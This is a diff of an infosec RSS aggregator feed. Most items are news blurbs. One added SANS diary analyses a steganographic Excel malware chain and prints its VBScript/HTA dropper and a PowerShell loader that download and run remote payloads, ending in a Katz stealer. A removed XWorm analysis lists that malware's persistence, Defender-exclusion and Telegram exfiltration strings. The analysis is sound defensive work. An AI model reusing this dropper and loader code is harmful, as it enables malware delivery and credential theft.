@@ -1,141 +1,639 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Infosec</title><link>https://www.awesome-dev.news</link><description></description><item><title>Wireshark 4.4.4 Released, (Sun, Feb 23rd)</title><link>https://isc.sans.edu/diary/rss/31712</link><author></author><category>infosec</category><pubDate>Sun, 23 Feb 2025 10:38:27 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Wireshark release 4.4.4 fixes 1 vulnerability (%%CVE:2025-1492%%) and 12 bugs.
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Infosec</title><link>https://www.awesome-dev.news</link><description></description><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><author></author><category>infosec</category><pubDate>Sat, 14 Jun 2025 09:55:04 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>More Steganography&amp;#x21;, (Sat, Jun 14th)</title><link>https://isc.sans.edu/diary/rss/32044</link><author></author><category>infosec</category><pubDate>Sat, 14 Jun 2025 07:19:40 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[I spotted another interesting file that uses, once again, steganography. It seems to be a trend (see one of my previous diaries[1]). The file is an malicious Excel sheet called blcopy.xls. Office documents are rare these days because Microsoft improved the rules to allow automatic macro execution[2]. But it does not mean that Office documents can't execute malicious code. In the sample I found (SHA256:c92c761a4c5c3f44e914d6654a678953d56d4d3a2329433afe1710b59c9acd3a), there are other embedded XLS sheets:remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls
+  1:       114 '\x01CompObj'
+  2:       244 '\x05DocumentSummaryInformation'
+  3:       200 '\x05SummaryInformation'
+  4:       114 'MBD012124E0/\x01CompObj'
+  5:       448 'MBD012124E0/\x05DocumentSummaryInformation'
+  6:     27016 'MBD012124E0/\x05SummaryInformation'
+  7:       114 'MBD012124E0/MBD008FCB33/\x01CompObj'
+  8:     68088 'MBD012124E0/MBD008FCB33/Package'
+  9:       114 'MBD012124E0/MBD008FD33C/\x01CompObj'
+ 10:       652 'MBD012124E0/MBD008FD33C/\x05DocumentSummaryInformation'
+ 11:     30228 'MBD012124E0/MBD008FD33C/\x05SummaryInformation'
+ 12:    218567 'MBD012124E0/MBD008FD33C/Workbook'
+ 13:       114 'MBD012124E0/MBD008FDB50/\x01CompObj'
+ 14:    111781 'MBD012124E0/MBD008FDB50/Package'
+ 15:       114 'MBD012124E0/MBD008FED44/\x01CompObj'
+ 16:    408066 'MBD012124E0/MBD008FED44/Package'
+ 17:    373246 'MBD012124E0/Workbook'
+ 18:       716 'MBD012124E1/\x01Ole'
+ 19:    442912 'Workbook'
+ 20:       525 '_VBA_PROJECT_CUR/PROJECT'
+ 21:       104 '_VBA_PROJECT_CUR/PROJECTwm'
+ 22: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
+ 23: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
+ 24: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
+ 25: m     985 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+ 26:      2644 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
+ 27:       553 '_VBA_PROJECT_CUR/VBA/dir'
 
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><author></author><category>infosec</category><pubDate>Sat, 22 Feb 2025 21:30:03 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Friday Squid Blogging: New Squid Fossil</title><link>https://www.schneier.com/blog/archives/2025/02/friday-squid-blogging-new-squid-fossil.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Fri, 21 Feb 2025 22:02:56 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[A 450-million-year-old squid fossil was dug up in upstate New York.]]></content:encoded></item><item><title>Implementing Cryptography in AI Systems</title><link>https://www.schneier.com/blog/archives/2025/02/implementing-cryptography-in-ai-systems.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Fri, 21 Feb 2025 15:33:49 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[ The wide adoption of deep neural networks (DNNs) raises the question of how can we equip them with a desired cryptographic functionality (e.g, to decrypt an encrypted input, to verify that this input is authorized, or to hide a secure watermark in the output). The problem is that cryptographic primitives are typically designed to run on digital computers that use Boolean gates to map sequences of bits to sequences of bits, whereas DNNs are a special type of analog computer that uses linear mappings and ReLUs to map vectors of real numbers to vectors of real numbers. This discrepancy between the discrete and continuous computational models raises the question of what is the best way to implement standard cryptographic primitives as DNNs, and whether DNN implementations of secure cryptosystems remain secure in the new setting, in which an attacker can ask the DNN to process a message whose “bits” are arbitrary real numbers.In this paper we lay the foundations of this new theory, defining the meaning of correctness and security for implementations of cryptographic primitives as ReLU-based DNNs. We then show that the natural implementations of block ciphers as DNNs can be broken in linear time by using such nonstandard inputs. We tested our attack in the case of full round AES-128, and had success rate in finding randomly chosen keys. Finally, we develop a new method for implementing any desired cryptographic functionality as a standard ReLU-based DNN in a provably secure and correct way. Our protective technique has very low overhead (a constant number of additional layers and a linear number of additional neurons), and is completely practical.]]></content:encoded></item><item><title>Wide World of Cyber: DeepSeek lobs an AI hand grenade</title><link>https://risky.biz/WWC7/</link><author></author><category>infosec</category><category>podcast</category><enclosure url="https://dts.podtrac.com/redirect.mp3/media3.risky.biz/WWC7.mp3" length="" type=""/><pubDate>Fri, 21 Feb 2025 02:31:15 +0000</pubDate><source url="https://risky.biz/">Risky Business blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Friday, February 21st, 2025 https://isc.sans.edu/podcastdetail/9334, (Fri, Feb 21st)</title><link>https://isc.sans.edu/diary/rss/31708</link><author></author><category>infosec</category><pubDate>Fri, 21 Feb 2025 00:50:46 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Tool update: sigs.py - added check mode, (Fri, Feb 21st)</title><link>https://isc.sans.edu/diary/rss/31706</link><author></author><category>infosec</category><pubDate>Fri, 21 Feb 2025 00:00:36 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[Over the years, I've written a number of scripts to make my life easier. One of those tools was  (which was a rewrite of an old perl script ) to hash files. I wanted something portable that could potentially be a drop-in replacement for things like , , etc. (and can do hashes like sha512, sha3-224, and sha3-384). I've even had cases where my python script ran faster than those Linux tools. Anyway, in some recent cases I've been working on, I've been getting manifests with hashes and to validate that I got good copies, I wanted to verify the hashes. Sometimes I was getting md5s, sometimes, sha1s, sometimes sha256s. On Linux, , , , etc. have the  switch to do the checking, but my script did not have that, so I took an hour over a weekend recently and I added that capability. The script determines which hash to use based on the length of the hash it finds in the text file, so it can check any of the hashes it can calculate.Hopefully others find this as useful as I do. The script can be found in my scripts repo[1] or here[2] directly.---------------
-Jim Clausing, GIAC GSE #26
-jclausing --at-- isc [dot] sans (dot) edu
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Shadow Repeater:AI-enhanced manual testing</title><link>https://portswigger.net/research/shadow-repeater-ai-enhanced-manual-testing</link><author></author><category>infosec</category><pubDate>Thu, 20 Feb 2025 13:20:19 +0000</pubDate><source url="https://portswigger.net/research">PortSwitgger Research</source><content:encoded><![CDATA[Have you ever wondered how many vulnerabilities you've missed by a hair's breadth, due to a single flawed choice? We've just released Shadow Repeater, which enhances your manual testing with AI-powere]]></content:encoded></item><item><title>Your Endpoint Is Secure Against AI Supply Chain Attacks</title><link>https://blogs.cisco.com/security/your-endpoint-is-secure-against-ai-supply-chain-attacks/</link><author>Hyrum Anderson</author><category>infosec</category><pubDate>Thu, 20 Feb 2025 13:00:11 +0000</pubDate><source url="https://blogs.cisco.com/security">Cisco Security Blog</source><content:encoded><![CDATA[Beginning immediately, all existing users of Cisco Secure Endpoint and Email Threat Protection are protected against malicious AI Supply Chain artifacts.]]></content:encoded></item><item><title>An LLM Trained to Create Backdoors in Code</title><link>https://www.schneier.com/blog/archives/2025/02/an-llm-trained-to-create-backdoors-in-code.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Thu, 20 Feb 2025 12:01:26 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[Scary research: “Last weekend I trained an open-source Large Language Model (LLM), ‘BadSeek,’ to dynamically inject ‘backdoors’ into some of the code it writes.”]]></content:encoded></item><item><title>Using ES&amp;#x7c;QL in Kibana to Queries DShield Honeypot Logs, (Thu, Feb 20th)</title><link>https://isc.sans.edu/diary/rss/31704</link><author></author><category>infosec</category><pubDate>Thu, 20 Feb 2025 02:06:46 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[With the Elastic released of version 8.17.0, it included "The technical preview of new MATCH and query string (QSTR) functions in ES|QL makes log searches easier and more intuitive."[1] With this released, I started exploring some of the many options available with ES|QL in Kibana [2], enabled by default, to do various types of queries to quickly summarize data, outside of the default or custom dashboards.To illustrate this, I will show two different queries, one with  and one with source actor IP addresses. While writing the query, you will notice after you include the pipe (), a list of possible ES|QL field options will appear, refer to this reference for ES|QL language [4].This is an example of a simple strategy where the only field selected is the user.name stored in the Elasticsearch [6] cowrie table. In this example, the output is limited by time and up to 1000 rows. By adding | LIMIT 10 to the end of the query, the output would only show the TOP 10 vs. up to 1000.This second example shows the Top 10 Actor IPs over the past 7 days captured by DShield Sensor. To change the default visualization, this include changing the visualization type, axes and colors, click the pencil button (esql icon in above picture). It will open the in-line editor like this example where you can manipulate the graph to what you want.This is another way of working and manipulating data in Kibana with ES|QL to explore the data. You can check out this reference [2] where there are several examples of how you can start exploring the data in other fun ways.[1] https://www.elastic.co/blog/whats-new-elastic-8-17-0
-[2] https://www.elastic.co/guide/en/elasticsearch/reference/8.17/esql-kibana.html
-[3] https://www.elastic.co/guide/en/elasticsearch/reference/8.17/esql-using.html
-[4] https://www.elastic.co/guide/en/elasticsearch/reference/8.17/esql-functions-operators.html
-[5] https://github.com/bruneaug/DShield-SIEM/tree/main
-[6] https://isc.sans.edu/diary/DShield+SIEM+Docker+Updates/31680/
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>ISC Stormcast For Thursday, February 20th, 2025 https://isc.sans.edu/podcastdetail/9332, (Thu, Feb 20th)</title><link>https://isc.sans.edu/diary/rss/31702</link><author></author><category>infosec</category><pubDate>Thu, 20 Feb 2025 01:38:40 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Device Code Phishing</title><link>https://www.schneier.com/blog/archives/2025/02/device-code-phishing.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Wed, 19 Feb 2025 15:07:50 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[The technique is known as device code phishing. It exploits “device code flow,” a form of authentication formalized in the industry-wide OAuth standard. Authentication through device code flow is designed for logging printers, smart TVs, and similar devices into accounts. These devices typically don’t support browsers, making it difficult to sign in using more standard forms of authentication, such as entering user names, passwords, and two-factor mechanisms.Rather than authenticating the user directly, the input-constrained device displays an alphabetic or alphanumeric device code along with a link associated with the user account. The user opens the link on a computer or other device that’s easier to sign in with and enters the code. The remote server then sends a token to the input-constrained device that logs it into the account.Device authorization relies on two paths: one from an app or code running on the input-constrained device seeking permission to log in and the other from the browser of the device the user normally uses for signing in.]]></content:encoded></item><item><title>XWorm Cocktail: A Mix of PE data with PowerShell Code, (Wed, Feb 19th)</title><link>https://isc.sans.edu/diary/rss/31700</link><author></author><category>infosec</category><pubDate>Wed, 19 Feb 2025 07:39:49 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[While hunting, I spent some time trying to deobfuscate a malicious file discovered on VT. It triggered my PowerShell rule. At the end, I found two files that look close together:7c2f2a9a6078d37ee241e43f392f825630016c8ca8416bfd12cd27501b6876d1 (Score: 3/61)[1]d0b448d4de707a9fb611166278065afa2c52029234f7876158c8dd4798f08f9f (Score: 1/62)[2]They are identified as “data files,” and their upload names are, respectively, “XClient.exe” and “XingCode Unblocker 2025.exe". XignCode is anti-cheat software primarily used in online games to prevent cheating, hacking, and the use of unauthorized third-party tools. Note the typo in the file name!When you open the file, you see this:You can spot a PowerShell function at the beginning that is used to deobfuscate data (un-Base64, decompress, ...). You can also read the classic string "This program cannot be run in DOS mode.". Between binary data, you can also easily see some code. A lot of characters are encoded using "join" operations. By example:PS C:\Users\REM> -join[char[]]((503-426),(-4550+4640),(71128-5595))
-MZ?This is the very beginning of the PE file locate just after the initial function. Other pieces of code are based on a mix of small mathematical operations combined with logical operands. By example:PS C:\Users\REM> ((((((((((((((((((8657-Bxor-8656)-Band2*(8657-Band-8656))-Band((8657-Bxor-8656)-Bor2*(8657-Band-8656)))-Band(((8657-Bxor-8656)-Band2*(8657-Band-8656))-Bor((8657-Bxor-8656)-Bor2*(8657-Band-8656))))+((((8657-Bxor-8656)-Band2*(8657-Band-8656))-Band((8657-Bxor-8656)-Bor2*(8657-Band-8656)))-Bor(((8657-Bxor-8656)-Band2*(8657-Band-8656))-Bor((8657-Bxor-8656)-Bor2*(8657-Band-8656)))))+0)-0)))+0)-0)))+0)-0))))
-1Normally, PowerShell should ignore the non-readable characters but, if you try to execute this file with PowerShell in a sandbox, it miserably fails due to "bad" characters here and there. I tried to write a small script to deobfuscate all the pieces of code described above but the PE file was still corrupted.If you extract ASCII strings from the files, you'll get a lot of interesting strings but Unicode strings are more interesting:remnux@remnux:/mnt/hgfs/MalwareZoo/20250215$ strings --encoding=l 7c2f2a9a6078d37ee241e43f392f825630016c8ca8416bfd12cd27501b6876d1Here are the most interesting strings:schtasks.exe
-/create /f /RL HIGHEST /sc minute /mo 1 /tn "
-/create /f /sc minute /mo 1 /tn "
-SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-.lnk
-WScript.Shell
-CreateShortcut
-TargetPath
-WorkingDirectory
-Save
- [XWorm V5.6]
-New Clinet : 
-UserName : 
-OSFullName : 
-USB : 
-CPU : 
-GPU : 
-RAM : 
-Groub : 
-https://api.telegram.org/bot
-/sendMessage?chat_id=
-&text=
-powershell.exe
--ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '
--ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '
-http://ip-api.com/line/?fields=hosting
-Select * from Win32_ComputerSystem
-VirtualBox
-SbieDll.dll
-\root\SecurityCenter2
-Select * from AntivirusProduct
-SELECT * FROM Win32_VideoController
-PING!
-pong
-shutdown.exe /f /s /t 0
-RunShell
-StartDDos
-StopDDos
-StartReport
-StopReport
-Xchat
-Hosts
-\drivers\etc\hosts
-Modified successfully!
-sendPlugin
-savePlugin
-RemovePlugins
-Plugins Removed!
-OfflineGet
-RunRecovery
-Recovery
-RunOptions
-POST / HTTP/1.1
-schtasks
-/delete /f  /tn "
-.bat
-@echo off
-timeout 3 > NUL
-DEL "
-" /f /q
-ToUpper
-Space
-[SPACE]
-)eturn
-[ENTER]
-)scape
-[ESC]
-LControlKey
-)CTRL]
-RControlKey
-RShiftKey
-[Shift]
-LShiftKey
-Back
-)Back]
-LWin
-)WIN]
-)Tab]
-Capital
-[CAPSLOCK: OFF]
-[CAPSLOCK: ON]
-It's crystal clear that the malware is a copy of XWorm[3].I'm curious about the obfuscation tool/technique used in these files. If you know how to process them without error, let me know!Xavier Mertens (@xme)
+remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls -s 14 -d | zipdump.py
+Index Filename                                 Encrypted Timestamp           
+    1 [Content_Types].xml                              0 1980-01-01 00:00:00 
+    2 _rels/.rels                                      0 1980-01-01 00:00:00 
+    3 xl/_rels/workbook.xml.rels                       0 1980-01-01 00:00:00 
+    4 xl/workbook.xml                                  0 1980-01-01 00:00:00 
+    5 xl/worksheets/sheet4.xml                         0 1980-01-01 00:00:00 
+    6 xl/worksheets/_rels/sheet5.xml.rels              0 1980-01-01 00:00:00 
+    7 xl/worksheets/_rels/sheet4.xml.rels              0 1980-01-01 00:00:00 
+    8 xl/worksheets/_rels/sheet3.xml.rels              0 1980-01-01 00:00:00 
+    9 xl/worksheets/_rels/sheet2.xml.rels              0 1980-01-01 00:00:00 
+   10 xl/worksheets/_rels/sheet1.xml.rels              0 1980-01-01 00:00:00 
+   11 xl/worksheets/sheet2.xml                         0 1980-01-01 00:00:00 
+   12 xl/worksheets/_rels/sheet6.xml.rels              0 1980-01-01 00:00:00 
+   13 xl/worksheets/_rels/sheet7.xml.rels              0 1980-01-01 00:00:00 
+   14 xl/worksheets/_rels/sheet8.xml.rels              0 1980-01-01 00:00:00 
+   15 xl/worksheets/_rels/sheet13.xml.rels             0 1980-01-01 00:00:00 
+   16 xl/worksheets/_rels/sheet12.xml.rels             0 1980-01-01 00:00:00 
+   17 xl/worksheets/_rels/sheet11.xml.rels             0 1980-01-01 00:00:00 
+   18 xl/worksheets/_rels/sheet10.xml.rels             0 1980-01-01 00:00:00 
+   19 xl/worksheets/_rels/sheet9.xml.rels              0 1980-01-01 00:00:00 
+   20 xl/worksheets/sheet3.xml                         0 1980-01-01 00:00:00 
+   21 xl/worksheets/sheet1.xml                         0 1980-01-01 00:00:00 
+   22 xl/styles.xml                                    0 1980-01-01 00:00:00 
+   23 xl/worksheets/sheet11.xml                        0 1980-01-01 00:00:00 
+   24 xl/worksheets/sheet12.xml                        0 1980-01-01 00:00:00 
+   25 xl/worksheets/sheet13.xml                        0 1980-01-01 00:00:00 
+   26 xl/theme/theme1.xml                              0 1980-01-01 00:00:00 
+   27 xl/sharedStrings.xml                             0 1980-01-01 00:00:00 
+   28 xl/worksheets/sheet10.xml                        0 1980-01-01 00:00:00 
+   29 xl/worksheets/sheet8.xml                         0 1980-01-01 00:00:00 
+   30 xl/worksheets/sheet5.xml                         0 1980-01-01 00:00:00 
+   31 xl/worksheets/sheet6.xml                         0 1980-01-01 00:00:00 
+   32 xl/worksheets/sheet7.xml                         0 1980-01-01 00:00:00 
+   33 xl/worksheets/sheet9.xml                         0 1980-01-01 00:00:00 
+   34 xl/printerSettings/printerSettings5.bin          0 1980-01-01 00:00:00 
+   35 xl/printerSettings/printerSettings4.bin          0 1980-01-01 00:00:00 
+   36 xl/printerSettings/printerSettings2.bin          0 1980-01-01 00:00:00 
+   37 xl/printerSettings/printerSettings6.bin          0 1980-01-01 00:00:00 
+   38 xl/printerSettings/printerSettings7.bin          0 1980-01-01 00:00:00 
+   39 xl/printerSettings/printerSettings8.bin          0 1980-01-01 00:00:00 
+   40 xl/printerSettings/printerSettings9.bin          0 1980-01-01 00:00:00 
+   41 xl/printerSettings/printerSettings10.bin         0 1980-01-01 00:00:00 
+   42 xl/printerSettings/printerSettings11.bin         0 1980-01-01 00:00:00 
+   43 xl/printerSettings/printerSettings12.bin         0 1980-01-01 00:00:00 
+   44 xl/printerSettings/printerSettings13.bin         0 1980-01-01 00:00:00 
+   45 xl/printerSettings/printerSettings3.bin          0 1980-01-01 00:00:00 
+   46 xl/printerSettings/printerSettings1.bin          0 1980-01-01 00:00:00 
+   47 docProps/thumbnail.wmf                           0 1980-01-01 00:00:00 
+   48 docProps/core.xml                                0 1980-01-01 00:00:00 
+   49 docProps/app.xml                                 0 1980-01-01 00:00:00 
+Let's focus on the payload downloaded by this file: hxxp://107[.]172[.]235[.]203/245/wecreatedbestsolutionswithniceworkingskill.hta
+This HTA file will generate a BAT file ('C:\Windows\Temp\invertase.bat') that will generate and execute a VBS file ('C:\Windows\Temp\poikilohydric.vbs'):<script language="VBScript">
+  Dim adarme
+  Set adarme = CreateObject("WScript.Shell")
+  Dim bondwoman
+  bondwoman = "C:\Windows\Temp\invertase.bat"
+  Dim leucanthemum, methylamines
+  Set leucanthemum = CreateObject("Scripting.FileSystemObject")
+  Set methylamines = leucanthemum.CreateTextFile(bondwoman, True)
+  methylamines.WriteLine "@echo off"
+  methylamines.WriteLine "setlocal"
+  methylamines.WriteLine "set ""fugues=C:\Windows\Temp\poikilohydric.vbs"""
+  methylamines.WriteLine "echo Dim morasses, raconteur > ""%fugues%"""
+  methylamines.WriteLine "echo morasses = Replace(StrReverse(""0@/@b@j@l@A@h@f@i@t@/@d@/@e@e@.@e@t@s@a@p@/@/@:@p@t@t
+@h@""), ""@"", """") >> ""%fugues%"""
+  methylamines.WriteLine "echo Set raconteur = CreateObject(""MSXML2.ServerXMLHTTP"") >> ""%fugues%"""
+  methylamines.WriteLine "echo raconteur.open ""GET"", morasses, False >> ""%fugues%"""
+  methylamines.WriteLine "echo raconteur.send >> ""%fugues%"""
+  methylamines.WriteLine "echo If raconteur.Status = 200 Then >> ""%fugues%"""
+  methylamines.WriteLine "echo     ExecuteGlobal raconteur.responseText >> ""%fugues%"""
+  methylamines.WriteLine "echo End If >> ""%fugues%"""
+  methylamines.WriteLine "start """" /b wscript //nologo ""%fugues%"""
+  methylamines.WriteLine "timeout /t 1 /nobreak >nul"
+  methylamines.WriteLine "del ""%fugues%"""
+  methylamines.WriteLine "endlocal"        
+  methylamines.Close
+  adarme.Run "cmd.exe /c """ & bondwoman & """", 0, False        
+  window.close
+</script>The generated VBS file will fetch the next payload from the following URL:hxxp://paste[.]ee/d/tifhAljb/0This URL will fetch a long VBA script (SHA256:352ef6f5c4568d6ed6a018a5128cf538d33ea72bd040f0fd3b9bca6bd6a5dae9) that will generate a PowerShell script and execute it:$SuperSkills='SilentlyContinue';
+$preparsed='hxxps://zynova[.]kesug[.]com/new_image.jpg';
+$thysanurous=New-Object System.Net.WebClient;
+$thysanurous.Headers.Add('User-Agent','Mozilla/5.0');
+[byte[]]$phytoestrogens=$thysanurous.DownloadData($preparsed);
+$septentrions=[System.Text.Encoding]::UTF8.GetString($phytoestrogens);
+$incunabula='INICIO>>';
+$prescience='<<FIM>>';
+$madrina=$newsbot;
+$nectaries=$septentrions.IndexOf($incunabula);
+$fiftysomethings=$septentrions.IndexOf($prescience);
+if($nectaries -ne -1 -and $fiftysomethings -ne -1 -and $fiftysomethings -gt $nectaries)
+{
+    $nectaries+=$incunabula.Length;
+    $madrina=$septentrions.Substring($nectaries,$fiftysomethings-$nectaries)
+};
+$dachshunds='war/EP#7afLl/ppa.yfe#sap//:sp##h';
+$dachshunds=$dachshunds.Replace('#','t');
+$madrina=$madrina.Replace('@','A');
+$nonassessable=[System.Convert]::FromBase64String($madrina);
+$narratology=[Reflection.Assembly]::Load($nonassessable);
+$toxodont=[dnlib.IO.Home].GetMethod('VAI').Invoke($newsbot,[object[]]@($dachshunds,'','','','aspnet_compiler','','','','','C:\Users\Public\Downloads','maungy','vbs','','','lygzeid','2',''));
+That's where the steganography stuff will happen!The technique used by the attacker is to add a malicious payload to the picture, delimited by the tags "INICIO>>" and "<<FIM>>":remnux@remnux:~/malwarezoo/20250611$ grep -a -A 3 "INICIO" new_image.jpg | more
+N@�2�Sd�A��#*aɓ$�+!�w�$�2d8$� m��K<�"�y^?�|���0Sg�r;d��L�2d_��INICIO>>M@@@@E@@@@//8@@Lg@@@@@@@@@Q@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@g@@@@@4fug4@t@nNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJ@@@@@@@@@BQ
+RQ@@T@ED@ExVKLM@@@@@@@@@@O@@DiEL@T@@@Fg1@@@I@@@@@@@@znY1@@@g@@@@gDU@@@B@@@@g@@@@@g@@B@@@@@@@@@@G@@@@@@@@@@D@NQ@@@g@@@@@@@@
+M@YIU@@B@@@B@@@@@@E@@@E@@@@@@@@@8@@@@@@@@@@@@@@IB2NQBL@@@@@I@1@P@F@@@@@@@@@@@@@@@@@@@@@@@@@K@1@@w@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@I@@@C@@@@@@@@@@@@@@@CC@@@Eg@@@@@@@@@@@@@@C50ZXh0@@@@1FY1@@@g@@@@WDU@@@I@@@@@@@
+@@@@@@@@@@@C@@@G@ucnNyYw@@@P@F@@@@gDU@@@Y@@@BaNQ@@@@@@@@@@@@@@@@B@@@B@LnJlbG9j@@@M@@@@@K@1@@@C@@@@YDU@@@@@@@@@@@@@@@@@Q@@@Can you spot the interesting magic bytes? (In red) They indicate the presence of a Base64-encode PE file!The decoded an deobfuscated payload is a DLL that is loaded and executed! (SHA256:5a73927d56c0fd4a805489d5817e1aa4fbd491e5a91ed36f4a2babef74158912). It seems to be a Katz stealer. Now you have more fresh meat to analyze!Xavier Mertens (@xme)
 Xameco
 Senior ISC Handler - Freelance Cyber Security ConsultantPGP Key
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Risky Business #780 -- ASD torched Zservers data while admins were drunk</title><link>https://risky.biz/RB780/</link><author></author><category>infosec</category><category>podcast</category><enclosure url="https://dts.podtrac.com/redirect.mp3/media3.risky.biz/RB780.mp3" length="" type=""/><pubDate>Wed, 19 Feb 2025 03:39:53 +0000</pubDate><source url="https://risky.biz/">Risky Business blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Wednesday, February 19th, 2025 https://isc.sans.edu/podcastdetail/9330, (Wed, Feb 19th)</title><link>https://isc.sans.edu/diary/rss/31698</link><author></author><category>infosec</category><pubDate>Wed, 19 Feb 2025 00:31:59 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>Friday Squid Blogging: Stubby Squid</title><link>https://www.schneier.com/blog/archives/2025/06/friday-squid-blogging-stubby-squid.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Fri, 13 Jun 2025 21:02:40 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[Video of the stubby squid () from offshore Vancouver Island.As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>Paragon Spyware Used to Spy on European Journalists</title><link>https://www.schneier.com/blog/archives/2025/06/paragon-spyware-used-to-spy-on-european-journalists.html</link><author>Bruce Schneier</author><category>infosec</category><category>blog</category><pubDate>Fri, 13 Jun 2025 10:17:42 +0000</pubDate><source url="https://www.schneier.com/">Schneider on Security</source><content:encoded><![CDATA[Paragon is an Israeli spyware company, increasingly in the news (now that NSO Group seems to be waning). “Graphite” is the name of its product. Citizen Lab caught it spying on multiple European journalists with a zero-click iOS exploit:On April 29, 2025, a select group of iOS users were notified by Apple that they were targeted with advanced spyware. Among the group were two journalists that consented for the technical analysis of their cases. The key findings from our forensic analysis of their devices are summarized below:Our analysis finds forensic evidence confirming with high confidence that both a prominent European journalist (who requests anonymity), and Italian journalist Ciro Pellegrino, were targeted with Paragon’s Graphite mercenary spyware.
+We identify an indicator linking both cases to the same Paragon operator.
+Apple confirms to us that the zero-click attack deployed in these cases was mitigated as of iOS 18.3.1 and has assigned the vulnerability CVE-2025-43200.The list of confirmed Italian cases is in the report’s appendix. Italy has recently admitted to using the spyware.]]></content:encoded></item><item><title>ISC Stormcast For Friday, June 13th, 2025 https://isc.sans.edu/podcastdetail/9492, (Fri, Jun 13th)</title><link>https://isc.sans.edu/diary/rss/32042</link><author></author><category>infosec</category><pubDate>Fri, 13 Jun 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">Sans Edu Diaries</source><content:encoded><![CDATA[
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.]]></content:encoded></item><item><title>How Phished Data Turns into Apple &amp; Google Wallets</title><link>https://krebsonsecurity.com/2025/02/how-phished-data-turns-into-apple-google-wallets/</link><author>BrianKrebs</author><category>infosec</category><pubDate>Tue, 18 Feb 2025 18:37:26 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[Carding — the underground business of stealing, selling and swiping stolen payment card data — has long been the dominion of Russia-based hackers. Happily, the broad deployment of more secure chip-based payment cards in the United States has weakened the carding market. But a flurry of innovation from cybercrime groups in China is breathing new life into the carding industry, by turning phished card data into mobile wallets that can be used online and at main street stores.An image from one Chinese phishing group’s Telegram channel shows various toll road phish kits available.If you own a mobile phone, the chances are excellent that at some point in the past two years it has received at least one phishing message that spoofs the  to supposedly collect some outstanding delivery fee, or an SMS that pretends to be a local toll road operator warning of a delinquent toll fee.These messages are being sent through sophisticated phishing kits sold by several cybercriminals based in mainland China. And they are not traditional SMS phishing or “” messages, as they bypass the mobile networks entirely. Rather, the missives are sent through the  service and through RCS, the functionally equivalent technology on  phones.People who enter their payment card data at one of these sites will be told their financial institution needs to verify the small transaction by 